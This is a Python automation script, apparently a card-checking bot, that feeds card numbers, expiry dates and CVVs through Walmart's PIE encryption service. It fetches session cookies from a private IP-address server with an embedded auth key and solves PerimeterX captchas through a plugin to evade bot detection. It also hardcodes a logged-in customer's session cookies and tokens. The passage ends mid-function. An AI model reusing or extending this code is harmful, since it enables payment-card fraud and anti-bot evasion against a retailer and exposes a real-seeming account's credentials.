import os, uuid, random, json, time, hashlib, base64, urllib.parse
from flowlite import Flow, step, finalize, expect, http
from flowlite.plugins import CurlDump, MaskCookies, ParseBetweenStrings, SQLiteWrapper, CaptchaWrapper
from flowlite.plugins.captcha_wrapper import CaptchaWrapper as CaptchaWrapperClass

flow = Flow("walmart").debug(trace=True)

LOG_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "logs", "curl"))
flow.use(MaskCookies)
flow.use(ParseBetweenStrings)
flow.use(SQLiteWrapper)
flow.use(CaptchaWrapper)
# flow.use(CurlDump, dir=LOG_DIR, include_response=True, split_by_flow=True)

@step("init_input")
def init_input(ctx):
    """Khởi tạo các biến input từ request"""
    ctx.CCNUM = ctx.data.get("CCNUM", "")
    ctx.MM = ctx.data.get("MM", "")
    ctx.YYYY = ctx.data.get("YYYY", "")
    ctx.CCV = ctx.data.get("CCV", "")
    
    expect.truthy(ctx.CCNUM, "CCNUM is required")
    expect.truthy(ctx.MM, "MM is required")
    expect.truthy(ctx.YYYY, "YYYY is required")
    expect.truthy(ctx.CCV, "CCV is required")

@step("get_pie_key")
def get_pie_key(ctx):
    """Lấy PIE key và key_id từ Walmart PIE service"""
    url = "https://securedataweb.walmart.com/pie/v1/wmcom_us_vtg_pie/getkey.js"
    
    r = (http.get(url)
           .accept("*/*")
           .header("accept-language", "en-US,en;q=0.9")
           .header("connection", "keep-alive")
           .accept_encoding("gzip, deflate, br")
           .user_agent("Walmart/2504042133 CFNetwork/1335.0.3.4 Darwin/21.6.0")
           .label("walmart-pie-getkey")
           .via_tls()
           .timeout(30.0)
           .send())
    
    expect.eq(r.status, 200, "Failed to get PIE key")
    
    body = r.text() or ""
    
    # Lấy PIE.K = "..." 
    ctx.PIEKEY = ctx.vars.parse_between(body, 'PIE.K = "', '";')
    if not ctx.PIEKEY:
        ctx.status = "BAN"
        raise AssertionError("BAN: PIEKEY not found in response")
    
    # Lấy PIE.key_id = "..." 
    ctx.key_id = ctx.vars.parse_between(body, 'PIE.key_id = "', '";')
    if not ctx.key_id:
        ctx.status = "BAN"
        raise AssertionError("BAN: key_id not found in response")
    
    # Validate key_id format (hex 6-8 characters)
    import re
    if not re.match(r'^[0-9a-fA-F]{6,8}$', ctx.key_id):
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Invalid key_id format: {ctx.key_id} (expected 6-8 hex characters)")
    
    # Validate PIEKEY format (hex 32 characters)  
    if not re.match(r'^[0-9a-fA-F]{32}$', ctx.PIEKEY):
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Invalid PIEKEY format: {ctx.PIEKEY}")

@step("run_pan_protector")
def run_pan_protector(ctx):
    """Chạy script pan-protector.full.js để mã hóa PAN và CVV"""
    from flowlite import js
    
    # Chuẩn bị arguments cho script
    script_args = {
        "PIEKEY": ctx.PIEKEY,
        "key_id": ctx.key_id,
        "CCNUM": ctx.CCNUM,
        "CCV": ctx.CCV
    }
    
    # Chạy script Node.js - js.run trả về trực tiếp kết quả
    try:
        data = js.run("flows/js/pie/pan-protector.full.js", script_args, expect="json", timeout=30.0)
        
        ctx.protected_s = data.get("s")
        ctx.protected_q = data.get("q") 
        ctx.protected_mac = data.get("mac")
        ctx.legacy_mode = data.get("legacy", False)
        
        expect.truthy(ctx.protected_s, "protected_s not found in script output")
        expect.truthy(ctx.protected_q, "protected_q not found in script output")
        expect.truthy(ctx.protected_mac, "protected_mac not found in script output")
        
    except Exception as e:
        raise AssertionError(f"Script failed: {e}")

@step("get_wm_cookies")
def get_wm_cookies(ctx):
    """Lấy cookies từ endpoint wm-cookies.txt"""
    url = "http://172.236.141.206:33668/getline/wm-cookies.txt"
    
    r = (http.get(url)
           .accept("*/*")
           .header("pragma", "no-cache")
           .header("accept-language", "en-US,en;q=0.8")
           .header("auth-key", "W6FBn0dIhAPsT8jsi2UnLXzMgtBb0YePNUk37T3pE4T07Tsuf7")
           .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")
           .label("wm-cookies-getline")
           .via_requests()  # Không qua TLS
           .timeout(30.0)
           .send())
    
    expect.eq(r.status, 200, "Failed to get wm-cookies")
    
    body = r.text() or ""
    
    # Lấy giá trị giữa "message":"{{{[{" và "}]}}}"
    ctx.cookie_all = ctx.vars.parse_between(body, '"message":"{{{', '}}}"')
    if not ctx.cookie_all:
        ctx.status = "BAN"
        raise AssertionError("BAN: cookie_all not found in response")

@step("call_captcha_plugin")
def call_captcha_plugin(ctx):
    """Sử dụng Captcha plugin để xử lý captcha và lưu vào database"""
    
    # Khởi tạo các biến nếu chưa có
    if not hasattr(ctx, 'pxhd'):
        ctx.pxhd = ""
    if not hasattr(ctx, 'Ua'):
        ctx.Ua = ""
    if not hasattr(ctx, 'sechua'):
        ctx.sechua = ""
    if not hasattr(ctx, 'paradata'):
        ctx.paradata = ""
    
    # Lấy proxy từ session
    session_proxy = ctx.session.get("proxy", "")
    ctx.session_proxy = session_proxy  # Lưu vào context
    print(f"DEBUG - Using proxy from session: {session_proxy}")
    
    # Chuẩn bị tham số cho Captcha plugin
    captcha_params = {
        "auth": "S[0EG;<67GH05EE607:I30E:F80I3F7:ED5E<I5",
        "site": "walmart",
        "proxyregion": "us",
        "region": "com",
        "proxy": session_proxy
    }
    
    print(f"DEBUG - Calling captcha plugin with params: {captcha_params}")
    
    # Tạo instance CaptchaWrapper trực tiếp
    captcha_wrapper = CaptchaWrapperClass()
    
    # Gọi Captcha plugin - nó sẽ tự động kiểm tra database và xử lý
    result = captcha_wrapper.generate_and_hold_captcha(
        flow_id=getattr(ctx, 'uuid', None),
        **captcha_params
    )
    
    print(f"DEBUG - Captcha plugin result: {result}")
    
    if result.get("success"):
        # Cập nhật các giá trị từ kết quả plugin
        ctx.Ua = result.get("UserAgent", "")
        ctx.sechua = result.get("secHeader", "")
        # pxhd chỉ có khi gọi /gen, không cập nhật từ holdcaptcha
        if result.get("pxhd"):
            ctx.pxhd = result.get("pxhd", "")
        ctx.paradata = result.get("data", "")
        
        # Debug: hiển thị các giá trị được cập nhật
        print(f"DEBUG - Updated Ua: {ctx.Ua}")
        print(f"DEBUG - Updated sechua: {ctx.sechua}")
        print(f"DEBUG - Updated pxhd: {getattr(ctx, 'pxhd', 'Not set')}")
        print(f"DEBUG - Updated paradata: {ctx.paradata}")
        
        # Lưu response đầy đủ
        ctx.holdcaptcha_response = {
            "error": False,
            "cookie": result.get("cookie", ""),
            "vid": result.get("vid", ""),
            "cts": result.get("cts", ""),
            "secHeader": result.get("secHeader", ""),
            "isMaybeFlagged": result.get("isMaybeFlagged", False),
            "UserAgent": result.get("UserAgent", ""),
            "flaggedPOW": result.get("flaggedPOW", False),
            "data": result.get("data", "")
        }
        
    else:
        # Xử lý lỗi
        error_msg = result.get("error", "Unknown captcha error")
        print(f"DEBUG - Captcha plugin failed: {error_msg}")
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Captcha plugin failed: {error_msg}")

@step("process_cookies_for_tls")
def process_cookies_for_tls(ctx):
    """Xử lý cookies để sử dụng với via_tls requests"""
    import json
    import re
    
    try:
        # Debug: in ra nội dung cookie_all để kiểm tra
        print(f"DEBUG - cookie_all length: {len(ctx.cookie_all)}")
        print(f"DEBUG - cookie_all first 200 chars: {ctx.cookie_all[:200]}")
        print(f"DEBUG - cookie_all last 200 chars: {ctx.cookie_all[-200:]}")
        
        # Thử parse JSON trực tiếp trước
        try:
            cookies_data = json.loads(ctx.cookie_all)
            print(f"DEBUG - Direct JSON parse successful, type: {type(cookies_data)}")
            
            if isinstance(cookies_data, list):
                cookie_pairs = []
                excluded_cookies = {'pxcts', '_pxvid', '_pxhd', '_px3'}
                
                for cookie in cookies_data:
                    if isinstance(cookie, dict) and 'name' in cookie and 'value' in cookie:
                        cookie_name = cookie['name']
                        if cookie_name not in excluded_cookies:
                            cookie_pairs.append(f"{cookie_name}={cookie['value']}")
                
                ctx.cookie_all_via_tls = "; ".join(cookie_pairs)
                print(f"DEBUG - Processed {len(cookie_pairs)} cookies from direct JSON (excluded px cookies)")
                print(f"DEBUG - Final cookie_all_via_tls length: {len(ctx.cookie_all_via_tls)}")
                print(f"DEBUG - Final cookie_all_via_tls preview: {ctx.cookie_all_via_tls[:200]}...")
                return
                
        except json.JSONDecodeError as e:
            print(f"DEBUG - Direct JSON parse failed: {e}")
        
        # Nếu JSON parse thất bại, thử unescape trước
        print("DEBUG - Trying to unescape JSON...")
        try:
            # Unescape JSON string
            unescaped = ctx.cookie_all.replace('\\"', '"').replace('\\\\', '\\')
            print(f"DEBUG - Unescaped first 200 chars: {unescaped[:200]}")
            
            cookies_data = json.loads(unescaped)
            print(f"DEBUG - Unescaped JSON parse successful, type: {type(cookies_data)}")
            
            if isinstance(cookies_data, list):
                cookie_pairs = []
                excluded_cookies = {'pxcts', '_pxvid', '_pxhd', '_px3', 'hasLocData', 'locDataV3', 'locGuestData'}
                
                for cookie in cookies_data:
                    if isinstance(cookie, dict) and 'name' in cookie and 'value' in cookie:
                        cookie_name = cookie['name']
                        if cookie_name not in excluded_cookies:
                            cookie_pairs.append(f"{cookie_name}={cookie['value']}")
                
                ctx.cookie_all_via_tls = "; ".join(cookie_pairs)
                print(f"DEBUG - Processed {len(cookie_pairs)} cookies from unescaped JSON (excluded px cookies)")
                print(f"DEBUG - Final cookie_all_via_tls length: {len(ctx.cookie_all_via_tls)}")
                print(f"DEBUG - Final cookie_all_via_tls preview: {ctx.cookie_all_via_tls[:200]}...")
                return
                
        except json.JSONDecodeError as e:
            print(f"DEBUG - Unescaped JSON parse failed: {e}")
        
        # Nếu vẫn thất bại, dùng regex như fallback
        print("DEBUG - Falling back to regex extraction...")
        cookie_pattern = r'"name":"([^"]+)"[^,]*"value":"([^"]+)"'
        matches = re.findall(cookie_pattern, ctx.cookie_all)
        
        if not matches:
            # Thử pattern cho escaped JSON
            escaped_pattern = r'\\"name\\":\\"([^"]+)\\"[^,]*\\"value\\":\\"([^"]+)\\"'
            matches = re.findall(escaped_pattern, ctx.cookie_all)
            print(f"DEBUG - Escaped pattern found {len(matches)} matches")
        
        if not matches:
            ctx.status = "BAN"
            raise AssertionError("BAN: No cookies found in response")
        
        # Tạo cookie string cho via_tls (loại bỏ px cookies)
        cookie_pairs = []
        excluded_cookies = {'pxcts', '_pxvid', '_pxhd', '_px3'}
        
        for name, value in matches:
            if name not in excluded_cookies:
                cookie_pairs.append(f"{name}={value}")
        
        # Lưu cookie string cho via_tls
        ctx.cookie_all_via_tls = "; ".join(cookie_pairs)
        
        # Debug: in ra số lượng cookies và một vài ví dụ
        print(f"DEBUG - Processed {len(cookie_pairs)} cookies for via_tls (excluded px cookies)")
        print(f"DEBUG - First few cookies: {cookie_pairs[:3]}")
        print(f"DEBUG - Final cookie_all_via_tls length: {len(ctx.cookie_all_via_tls)}")
        print(f"DEBUG - Final cookie_all_via_tls preview: {ctx.cookie_all_via_tls[:200]}...")
        
    except Exception as e:
        ctx.status = "BAN"
        raise AssertionError(f"BAN: Failed to process cookies: {e}")

@step("get_database_cookies")
def get_database_cookies(ctx):
    """Lấy dữ liệu cookies từ database để sử dụng cho các step tiếp theo"""
    try:
        # Lấy SQLite plugin instance
        from flowlite.plugins.sqlite import get_sqlite_plugin
        sqlite_plugin = get_sqlite_plugin()
        
        # Lấy flow_id từ context
        flow_id = getattr(ctx, 'uuid', None)
        print(f"DEBUG - Flow ID: {flow_id}")
        
        # Query để lấy dữ liệu pxhold mới nhất (từ bất kỳ flow nào)
        conn = sqlite_plugin._get_connection()
        cursor = conn.cursor()
        
        # Thử lấy từ flow hiện tại trước
        if flow_id:
            cursor.execute('''
                SELECT cookie, pxhd, UserAgent, sechua, vid, cts 
                FROM pxhold 
                WHERE flow_id = ? AND error = 0 
                ORDER BY updated_at DESC 
                LIMIT 1
            ''', (flow_id,))
            result = cursor.fetchone()
            
            if result:
                print(f"DEBUG - Found data for flow_id: {flow_id}")
            else:
                print(f"DEBUG - No data for flow_id: {flow_id}, trying any recent data...")
                # Nếu không có data cho flow này, lấy data gần đây nhất
                cursor.execute('''
                    SELECT cookie, pxhd, UserAgent, sechua, vid, cts 
                    FROM pxhold 
                    WHERE error = 0 
                    ORDER BY updated_at DESC 
                    LIMIT 1
                ''')
                result = cursor.fetchone()
        else:
            print("DEBUG - No flow_id, getting most recent data...")
            # Lấy data gần đây nhất
            cursor.execute('''
                SELECT cookie, pxhd, UserAgent, sechua, vid, cts 
                FROM pxhold 
                WHERE error = 0 
                ORDER BY updated_at DESC 
                LIMIT 1
            ''')
            result = cursor.fetchone()
        
        conn.close()
        
        if result:
            cookie, pxhd, user_agent, sechua, vid, cts = result
            
            # Lưu vào context
            ctx.cookie_px3 = cookie or ""
            ctx.cookie_pxhd = pxhd or ""
            ctx.px_ua = user_agent or ""
            ctx.px_sechua = sechua or ""
            ctx.cookie_pxvid = vid or ""
            ctx.cookie_pxcts = cts or ""
            
            print(f"DEBUG - Retrieved from database:")
            print(f"DEBUG - cookie_px3: {ctx.cookie_px3[:100]}..." if ctx.cookie_px3 else "DEBUG - cookie_px3: None")
            print(f"DEBUG - cookie_pxhd: {ctx.cookie_pxhd[:50]}..." if ctx.cookie_pxhd else "DEBUG - cookie_pxhd: None")
            print(f"DEBUG - px_ua: {ctx.px_ua[:50]}..." if ctx.px_ua else "DEBUG - px_ua: None")
            print(f"DEBUG - px_sechua: {ctx.px_sechua[:50]}..." if ctx.px_sechua else "DEBUG - px_sechua: None")
            print(f"DEBUG - cookie_pxvid: {ctx.cookie_pxvid[:50]}..." if ctx.cookie_pxvid else "DEBUG - cookie_pxvid: None")
            print(f"DEBUG - cookie_pxcts: {ctx.cookie_pxcts[:50]}..." if ctx.cookie_pxcts else "DEBUG - cookie_pxcts: None")
        else:
            print("DEBUG - No pxhold data found in database at all")
            # Khởi tạo với giá trị rỗng
            ctx.cookie_px3 = ""
            ctx.cookie_pxhd = ""
            ctx.px_ua = ""
            ctx.px_sechua = ""
            ctx.cookie_pxvid = ""
            ctx.cookie_pxcts = ""
            
    except Exception as e:
        print(f"DEBUG - Error retrieving database cookies: {e}")
        import traceback
        traceback.print_exc()
        # Khởi tạo với giá trị rỗng nếu có lỗi
        ctx.cookie_px3 = ""
        ctx.cookie_pxhd = ""
        ctx.px_ua = ""
        ctx.px_sechua = ""
        ctx.cookie_pxvid = ""
        ctx.cookie_pxcts = ""

@step("add_px_cookies_to_via_tls")
def add_px_cookies_to_via_tls(ctx):
    """Thêm các px cookies vào cookie_all_via_tls"""
    try:
        custom_cookie = "ACID=7d60f9ac-9158-4cc7-a700-a8917394fade; hasACID=true; abqme=true; vtc=YTPzCPVZZ0OTpH7c27RA7w; isoLoc=VN_HN_t3; io_id=54605ce0-5a16-4025-9c90-cd83c816a18c; _m=9; userAppVersion=usweb-1.224.0-fb801e0fe2dd28531a9b6c1d77cb85044cf70d55-9251249r; _astc=9559d4594c147f3f3c4c25688e580987; walmart-identity-web-code-verifier=aVbAcXFNXpG5wqDCd6H4fyveOUJNHeBQ0Pn4Gxz_Yog; pxcts=3fa0601a-9c76-11f0-a667-d1059039cc5b; _pxvid=3d4750b6-9c76-11f0-bd8a-88f4403879a8; assortmentStoreId=3081; hasLocData=1; TS012af430=0137085862ef261fc35b154d563dae634fc2d8b11d9bb9039e3b26a60f2fc973c455ace6a812e386ca0198623b7da701cd82ba8485; CID=a16f8dc0-3fd8-40b6-8e34-34881880d399; SPID=MDYyMTYyMDI1R8HRsmd0YPj2oTJaF33pyw8DN_d9G1xwoIuXUkTx9fyT5OFzMolq9393-DPcivaBPdCKtWLWTW2WiycECFBSq6H2pAYiWV6XKbXPCw; customer=%7B%22firstName%22%3A%22George%22%2C%22lastNameInitial%22%3A%22L%22%2C%22ceid%22%3A%2225a007347f450489af134a8a10a6fa30e1baa8740e7c29c25c31398d97b9083a%22%7D; hasCID=1; type=REGISTERED; wm_accept_language=en-US; locGuestData=eyJpbnRlbnQiOiJTSElQUElORyIsImlzRXhwbGljaXQiOmZhbHNlLCJzdG9yZUludGVudCI6IlBJQ0tVUCIsIm1lcmdlRmxhZyI6ZmFsc2UsImlzRGVmYXVsdGVkIjp0cnVlLCJwaWNrdXAiOnsibm9kZUlkIjoiMzA4MSIsInRpbWVzdGFtcCI6MTc1OTA2OTIxMzYzNSwic2VsZWN0aW9uVHlwZSI6IkRFRkFVTFRFRCJ9LCJzaGlwcGluZ0FkZHJlc3MiOnsidGltZXN0YW1wIjoxNzU5MDY5MjEzNjM1LCJ0eXBlIjoicGFydGlhbC1sb2NhdGlvbiIsImdpZnRBZGRyZXNzIjpmYWxzZSwicG9zdGFsQ29kZSI6Ijk1ODI5IiwiZGVsaXZlcnlTdG9yZUxpc3QiOlt7Im5vZGVJZCI6IjMwODEiLCJ0eXBlIjoiREVMSVZFUlkiLCJ0aW1lc3RhbXAiOjE3NTkwNjkyMTM2MzQsImRlbGl2ZXJ5VGllciI6bnVsbCwic2VsZWN0aW9uVHlwZSI6IkRFRkFVTFRFRCIsInNlbGVjdGlvblNvdXJjZSI6bnVsbH1dLCJjaXR5IjoiU2FjcmFtZW50byIsInN0YXRlIjoiQ0EifSwicG9zdGFsQ29kZSI6eyJ0aW1lc3RhbXAiOjE3NTkwNjkyMTM2MzUsImJhc2UiOiI5NTgyOSJ9LCJtcCI6W10sIm1zcCI6eyJub2RlSWRzIjpbXSwidGltZXN0YW1wIjpudWxsfSwibXBEZWxTdG9yZUNvdW50IjowLCJzaG93TG9jYWxFeHBlcmllbmNlIjpmYWxzZSwic2hvd0xNUEVudHJ5UG9pbnQiOmZhbHNlLCJtcFVuaXF1ZVNlbGxlckNvdW50IjowLCJ2YWxpZGF0ZUtleSI6InByb2Q6djI6N2Q2MGY5YWMtOTE1OC00Y2M3LWE3MDAtYTg5MTczOTRmYWRlIn0=; AID=wmlspartner=0:reflectorid=0000000000000000000000:lastupd=1759069215814; __pxvid=41df98b8-9c76-11f0-86f5-5a33725df641; if_id=FMEZARSF93kiRBJOaLpFxSlH39nj0fiaTYIVsgFd/ReRtbCdaw9fMW697Qmvd14UTYKX6qA6SJATxQRbdms2vhTHMy9nGre4TLqXKuIrHk73CrRQp3ElGWgZrfrD1JwvbeKBC0jbjZr6YxVwDDG1oPvYUk0coxlI87gTAw1MgfhyfmMYDVOol0iIqa47jr20RdL862hLav62p11kk3rFiJm5ZBR/VnFmOKJCsekmOSlvzMjR28Fg8TCT422k69yz0nBN4vBvrwN3G+k1cwtKnEA/+vKcf2cwc4/5cg0GZj3lcAow309yL9cMUNp8uT9RN9GsAyWstJyhEUQrPQ==; TS016ef4c8=01a0035ddc754f54add7c9e99793c5c96233a6b4c246bbcf806f7d16b2590f1482500129d8316158d77a369b3157d4ef088f084394; TS01f89308=01a0035ddc754f54add7c9e99793c5c96233a6b4c246bbcf806f7d16b2590f1482500129d8316158d77a369b3157d4ef088f084394; TS8cb5a80e027=08e9f9024aab20000ec3925ebc20cf5df101a9849e37df1590089b97eb47211103980dbc689a18620804debb54113000dfee313146045f9a8a6dbd82d4e6c577e5b8bd6ab0fc1f496b11e36d555f8b99ac05d585ea04da3c98f1e314de7379db; xpa=-5-yD|-dl5I|-hwLU|1DB8T|2Brwr|3Kopn|3Xes_|3d8P6|3lffD|4950w|4mZde|66yjf|7IMe9|7ZWez|8UWH4|BYzSI|EGJef|EaBfd|EeXYg|FgoiY|Gk6n1|I9nzL|IPd0z|KJIJs|KYp8P|LTduQ|LkfJa|M62Wj|Mx7J7|OLPlS|Oi5D4|P1gpb|P3aPs|PKA1g|QPToB|RL078|RTwYn|S7Hy9|TCS94|TO_e8|Tq8sA|UXYCa|Uhyp2|VFOGI|Vtlq3|XTqP_|_7RrM|_MmQi|bmd5b|bzMJc|c9SXY|dEGcY|dkTyl|eVb-j|f4tI4|fdm-7|flqYL|h6nfw|iHk39|j2D95|jM1ax|jPq86|kD20O|lDoEE|nd-Kk|o0JjB|ozs5w|pC-ah|pVetj|q00Zt|sYZ7o|tyEVT|u7rEL|vG33N|yFWY4|zR-nl; exp-ck=-hwLU11DB8T32Brwr33Xes_c3d8P613lffD14950w14mZde166yjf17ZWez18UWH41BYzSI1EGJef1EaBfd1Gk6n11KJIJs1KYp8P1LTduQ1LkfJa1Mx7J72OLPlS1P3aPs1PKA1g1QPToB1S7Hy92TCS941TO_e81Tq8sA1UXYCa1Uhyp21VFOGI1Vtlq32XTqP_1_7RrM4_MmQi1c9SXY1dEGcY3f4tI41fdm-71flqYL5h6nfw3iHk391j2D954jPq865kD20O6nd-Kk1ozs5w1pC-ah1pVetj1q00Zt2sYZ7obtyEVT1u7rEL1vG33N1; ak_bmsc=F9B3E497DD54FBEDFF90D71E6A570D84~000000000000000000000000000000~YAAQVzNDG8gzzYaZAQAAyp3hkR1yyS33udh3b15TMmf1mUhzmhh8H/qzXaLWV2caHlTY5rxdAbczTfeZwXFZHIataXsTuxwNbUNiubZII6LOoOI7pl0Tkiaz+AkSuDGYfEYnFWCQ2dve3eNSTkQfjf9H1JAsnus+0F48HhR6y5rVxpsDj5iusAB8R4cHTFLHK7Odn2dYIGlyDB3RFjKnSwKrxR0PA63NLKFt+On6v7QZlJmQM5lxKWLBknbV2LfYfeGq+P8mU9sglkMv7bHv08rdzz08M3fWBnM7Z2QstsD6bj1VVWGMxLH99Oti911zbvqblJrWQpweeGKJDtuOBdqtJ+ee4T6KRVePKVb9MFPwPUHqy2pt5CM4B4qw8+cIGlyqZOLwECpnYgXEQbRN; bstc=Uh4bH5X2WGsmbvfIDkyk84; _s=:1759089113401; _sc=FS9+kp+7LWfkjIZrgnGHYTYlvXG19E1HuZZgI5iM5WU=; _tpl=40; _tplc=+GY+aALw+n1Uduj87mc+9jMs4lBMpRokKZFbWnIOcBM=; _intlbu=false; _shcc=US; xpth=x-o-mart%2BB2C~x-o-mverified%2Bfalse; xptwj=uz:cf2c7532aeb998de1b3c:H8OXu824tMm4qRlmPJunkX9qF+Dc1l+GyEZYHHF+ewilB+a+QmA4iNsgu9GTd4mjqRBIxpjm1hy1wC7tT5uwwQIgp+xMaAu9ZvBu+ZqviJw2c0BNTzV+gHze5TJ3TwG1JOkrW8t7Cc89pPiAKQ3+/fdvbkVAaut//P4CyLdmLd5LOZVHKC01saVjxA==; bm_mi=F2878A4073F92C3E7C5D74E9F093A0F1~YAAQZTNDGyfGdYaZAQAA2brhkR2oRqIuyAttu0ugDzW7j8uIWzwGquIsjX9kWQgV9dUcdZWJqSKlm4pZPFFl8voMpHAe7aoyNnO1iL/dL1n9Grr92hR8Emi1wsv8iCTv3hKyWcZX1lMgh6h6UF8tmZmgAZi0rIV4UtGRbJrsVB1gigMceH5pLf4tmQsWi64TSaqDHDdLxv6KIGHJt7SbNVlnjrRNn+62Jn0afyZXTPx2ReMfFaA9JFvhSUHAuGQjFhwZTJt0E8PrWcZ3xgoJzfqIaZhxMOfyqr7nxFpPQrKkRKPMMkaA75MxxyFkr/rSpiicGGzu9Iro31nk7frP2T4YqYjAYFVp~1; mp_9c85fda7212d269ea46c3f6a57ba69ca_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A19990b1db665b2-07d37409bccb5c-7e433c49-1fa400-19990b1db665b2%22%2C%22%24device_id%22%3A%20%2219990b1db665b2-07d37409bccb5c-7e433c49-1fa400-19990b1db665b2%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.walmart.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.walmart.com%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.walmart.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.walmart.com%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; _tsc=MTQyODYyMDIyGxHu6U0iI5L0dK8jG7JuRJLXFyNl6L66T%2BawUUTrjZovbNVjh1UtpofQgdHl61dq1ARq0FxMGQwmcCoN%2BaM3Wf3n8H%2BleqQpjc5g5JttCvdI5jR4m6WwengQ6Oli5uHOCmsQn39NHTOvzIjbl60mSgVA1mCYqDe4W37gIogEWqQW%2Bc9%2BzG0GValuzKK4o7WXlBZiL6UeOnhaOCBAbFbp5uakm4n5DqihSwuCykvQLOmGU12%2B4DiMgDP%2F6HG%2FN4vod4QcUUAwS5oFS0VoBuReqlwRg9aOGsvb2AD%2Fdg88zPHgzML3mhI3sxpI7b9B4SXKrdWlbneJJcl9wUWw3YKA9Vq8VNMZEJ3HWsImlz76XKo8DXzJJYTDNDfNWQDRPEbY%2B28nXHHffenmf8ESEBO9d3Bx1nIr9bATkU9xgJzxFen%2Bp9ByO4H4otJO3NiPH%2BTDhg%2FwReuUTkjxFQ%3D%3D; _vc=BTZQZ5Qzw25FmBtrsaoLAAjdtuIAmji7uLlHvt%2BfIBk%3D; auth=MTAyOTYyMDE4gbLnSCGU65UH84lBzLoJ8OYxNHwk9CuP68AVSn40ZprN5XjHXh2YEwc4AdpcTphyOd6IrQFTKzUn1gdnHv3MwCnSDCDbyZPilPG8tEgeCAMe0kk71JFQo0Jehzv5B%2Bb9tp4PYtnTPrH3YwCBYIU2jmzUCdxxZsivkQ3PhCH2a63ajw5z9q9AFqkSgFlyfE3tZOUTgCWTUPpBUQ0BsmWeTEOmufKwVHRCRqMPUsZ6WpKqGXTRjJD7g6PyDs3UqmGUpGd2w9VMvEOMsmi01MtA%2F%2BjC%2FkXNt5gv2Ux4Ku%2BozcsTZQYlcbwSrIQJ6%2BWWFLtDzsDD8rhlZOa%2FhgQxqp0YPAFhEHJYgGD00%2FxMAzhrl8i%2FewOPf%2FBzp5sIAzshwikRIw6vTt8V7%2BqSWYVIQ3Oe3ful%2FFbuEYzUhsKWW6sYaVQ%3D; xptc=_m%2B9~_s%2B:1759089113401~assortmentStoreId%2B3081; akavpau_p4=1759089714~id=94198b11ca36f07a801e33bd851b4480; AZ_ST_CART=%7B%22mtoken%22%3A%22804%3A42%23516479592%235%3D104104897%238%3D418917707%22%2C%22itoken%22%3A%7B%22UK_CART_OWNER_T_V%22%3A%22435%3A59%23168700916%235%3D37590072%238%3D63970792%22%7D%7D; undefined=OMNI_PROMISE; com.wm.reflector=\"reflectorid:0000000000000000000000@lastupd:1759089115000@firstcreate:1759069209708\"; _lat=MDYyMTYyMDI1tdEQFARwYZ2uHiPNGR-pxe0V5pKMCO-Km-Z6FhDauQCEVbtTbUiPlcQ; _msit=MDYyMTYyMDI1N-JEBtKo-JFXhPO0U6JqR-H8v00GCizmi6YORD2Wgl4bxioQ; xpm=1%2B1759089114%2BYTPzCPVZZ0OTpH7c27RA7w~a16f8dc0-3fd8-40b6-8e34-34881880d399%2B0; xptwg=2918571031:122B4354CFF3BC0:2C5C756:3F1324CF:1AD2ED4E:CFA83D93:; TS012768cf=01c8291f66f34ed65374c421165ee98157826e30edd47049d47b3f4c36aa084eea974c0cac9173c47524228bc5338c87a77df41b69; TS01a90220=01c8291f66f34ed65374c421165ee98157826e30edd47049d47b3f4c36aa084eea974c0cac9173c47524228bc5338c87a77df41b69; TS2a5e0c5c027=084555058bab2000e297f8775548938323f3206966d007b038a3c1f9eea37e52822031f819cace020893a324fa113000c0c017a24572c94ba5edcee028676f282a9a2c5777e616613c5be6a5f8b45b511b786f34247cd0a06eed75cd36885cc9; akavpau_p2=1759089715~id=b3833c10495e07f6a8dca80a0540b09e; bm_sv=D4B50C29FA9B2C4C2E5A3FD5601DB39F~YAAQZTNDGzHGdYaZAQAACcLhkR23ji3R7qAR1xlRtMceSq5bCb7+hDIGpcduLV4gAAE/MCKPCQfX3DMhZbqUwee9v5WmBfr+tvziCiP4gaojUeoGVSeprI6nqMUTODQf0Yxapc+yWn5HxIl9z3Qi26zQKG4H+ExQEwOwCt9IR048eQgCgbpYUjRm6pxX2FY5oT+mpVNiZbyLDBGLrEZq4nW75+0UvnRgfH2m+xspwnI1O6lhMqsoMh3asyVfDrdKxQ==~1"
        # Lấy cookie_all_via_tls hiện tại
        current_cookies = custom_cookie
        #current_cookies = ctx.get("cookie_all_via_tls", "")
        
        # Tạo danh sách px cookies
        px_cookies = []
        
        # Thêm pxcts
        if ctx.get("cookie_pxcts"):
            px_cookies.append(f"pxcts={ctx.cookie_pxcts}")
        
        # Thêm _pxvid
        if ctx.get("cookie_pxvid"):
            px_cookies.append(f"_pxvid={ctx.cookie_pxvid}")
        
        # Thêm _pxhd
        if ctx.get("cookie_pxhd"):
            px_cookies.append(f"_pxhd={ctx.cookie_pxhd}")
        
        # Thêm _px3 (loại bỏ _px3= prefix nếu có)
        if ctx.get("cookie_px3"):
            px3_value = ctx.cookie_px3
            # Loại bỏ _px3= prefix nếu có
            if px3_value.startswith("_px3="):
                px3_value = px3_value[5:]  # Bỏ qua 5 ký tự đầu "_px3="
            px_cookies.append(f"_px3={px3_value}")
        
        # Kết hợp cookies hiện tại với px cookies
        all_cookies = []
        
        # Thêm cookies hiện tại nếu có
        if current_cookies:
            all_cookies.append(current_cookies)
        
        # Thêm px cookies
        if px_cookies:
            all_cookies.extend(px_cookies)
        
        # Cập nhật cookie_all_via_tls
        ctx.cookie_all_via_tls = "; ".join(all_cookies)
        
        print(f"DEBUG - Added {len(px_cookies)} px cookies to via_tls:")
        for cookie in px_cookies:
            print(f"DEBUG - {cookie[:50]}..." if len(cookie) > 50 else f"DEBUG - {cookie}")
        
        print(f"DEBUG - Total cookies in via_tls: {len(ctx.cookie_all_via_tls.split('; '))}")
        
    except Exception as e:
